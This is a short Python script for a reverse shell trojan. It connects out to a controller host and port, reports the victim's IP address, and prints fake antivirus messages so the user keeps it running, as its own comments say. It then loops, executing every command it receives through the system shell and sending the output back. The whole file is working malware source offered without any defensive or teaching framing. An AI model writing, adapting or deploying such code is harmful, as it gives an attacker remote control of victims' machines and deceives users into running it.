import socket
import subprocess as sp
import sys
import time

host = "127.0.0.1" #The host IPv4 address
port = 5555 #The Hosting port
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Setting up connection
try:
    conn.connect((host, port))#Setting up connection
    shoc = sp.Popen("echo Connected!", shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    out = shoc.stdout.read() + shoc.stderr.read()
    conn.send(out) #Send if connected
    
    hn = socket.gethostname() 
    IP = socket.gethostbyname(hn) #To get the victim's IPv4 address
    shoc = sp.Popen("echo "+str(IP), shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    out = shoc.stdout.read() + shoc.stderr.read()
    conn.send(out)
    
    print("Scanning and managing files...") #Pretend to be an antivirus
    print("\nThis will keep managing and guarding your files, it will report to your computer when it spot threats, close it you will lose the management of your files.")
    f = open("Threats.txt", "w")
    
    while True:
        shoc = sp.Popen("echo :", shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        out = shoc.stdout.read() + shoc.stderr.read()
        conn.send(out)
        command = conn.recv(1024) #Recieve commands from host
        str = command.decode("utf-8") #Decode to read a command
        if command.strip().decode("utf-8") == "kill": #To end attack
            break
        sh = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE) #Execute command
        output = sh.stdout.read() + sh.stderr.read()
        conn.send(output) #Return the results to host
except Exception as error:
    print(error)
    raise
